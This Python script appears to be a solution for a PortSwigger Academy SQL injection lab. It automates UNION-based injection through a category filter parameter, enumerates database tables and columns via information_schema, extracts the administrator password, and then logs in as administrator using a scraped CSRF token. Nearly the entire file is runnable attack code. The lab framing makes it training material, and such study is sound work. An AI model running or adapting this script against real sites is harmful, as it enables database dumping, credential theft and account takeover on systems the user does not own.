#!/usr/bin/python3

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Interface ():
    def __init__ (self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> SQL injection attack, listing the database contents on non-Oracle databases')
        print('    >> by Port Swigger Academy\n')

    def info (self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning (self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error (self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success (self, message):
        print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")

# Instantiate our interface class
global output
output = Interface()
output.header()

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def perfom_request(url, sqli_payload):
    path = '/filter?category=Accessories'
    r = requests.get(url+path+sqli_payload, verify=False, proxies=proxies)
    return r.text

def sqli_users_table(url):
    sqli_payload = "' UNION SELECT NULL, table_name FROM information_schema.tables--"
    response = perfom_request(url, sqli_payload)
    soup = BeautifulSoup(response, 'html.parser')
    users_table = soup.find(text=re.compile('.*users.*'))
    if users_table:
        return users_table
    else:
        return False
def sqli_users_columns(url, users_table):
    sqli_payload = "' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name = '%s'--" % users_table
    response = perfom_request(url, sqli_payload)
    soup = BeautifulSoup(response, 'html.parser')
    username_column = soup.find(text=re.compile('.*username.*'))
    password_column = soup.find(text=re.compile('.*password.*'))
    return username_column, password_column

def sqli_administrator_cred(url, users_table, username_column, password_column):
    sqli_payload = "' UNION SELECT %s, %s FROM %s--" %(username_column, password_column, users_table)
    response = perfom_request(url, sqli_payload)
    soup = BeautifulSoup(response, 'html.parser')
    admin_password = soup.body.find(text="administrator").parent.findNext('td').contents[0]
    return admin_password

def get_csrf_token(s, url):
    path = "/login"
    response = s.get(url+path, verify=False, proxies=proxies)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def login_as_an_administrator(s, url, admin_password):
    csrf = get_csrf_token(s, url)
    path = "/login"
    data = {"csrf": csrf, "username": "administrator", "password": admin_password}
    response = s.post(url+path, data=data, verify=False, proxies=proxies)
    if "Log out" in response.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        output.info("Usage: %s <url>" % sys.argv[0])
        output.info("Example: %s wwww.example.com" % sys.argv[0])
        sys.exit(-1)
    output.info("Looking for a users table...")
    users_table = sqli_users_table(url)
    if users_table:
        output.success("Found the users table name: %s " % users_table)
        username_column, password_column = sqli_users_columns(url, users_table)
        if username_column and password_column:
            output.success("Found the username column name: %s" % username_column)
            output.success("Found the password column name: %s" % password_column)

            admin_password = sqli_administrator_cred(url, users_table, username_column, password_column)
            if admin_password:
                output.success("The administrator password is: %s" % admin_password)

                output.info("Try to login as an Administrator...")
                s = requests.Session()
                if login_as_an_administrator(s, url, admin_password):
                    output.success("We have logged as an Administrator!")
                else:
                    output.error("Did not login as an Administrator")
            else:
                output.error("Did not find the administrator password.")
        else:
            output.error("Did not find username and/or password columns.")
    else:
        output.error("Did not find a users table.")